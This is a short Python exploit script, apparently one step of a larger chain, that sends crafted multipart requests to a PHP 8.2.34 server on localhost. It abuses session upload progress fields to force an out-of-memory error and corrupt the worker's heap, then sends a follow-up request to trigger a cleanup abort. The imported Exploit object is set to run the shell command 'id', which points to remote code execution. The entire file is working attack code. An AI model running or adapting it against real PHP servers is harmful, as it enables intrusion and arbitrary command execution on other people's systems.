#!/usr/bin/env python3
"""Send the OOM request (reqA) to 8.2.34 to corrupt the worker's heap."""
import os
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, Exploit, build_multipart
t = Target("http://127.0.0.1:18111/index.php", timeout=90.0, verbose=False)
ex = Exploit(t, "id", profile="bookworm")
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name":"PHPSESSID","data":b"\x00"},
          {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
          ex._file_part(), ex._big_field()]
r = t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=1<<20)
body = r.partition(b"\r\n\r\n")[2]
print("oom:", b"memory size" in body, "body:", body[:80])
# follow-up (session init) to trigger the pre-RINIT cleanup abort, like rotate()
parts2 = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
          {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
t.post(build_multipart(parts2, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20.0)
print("done")
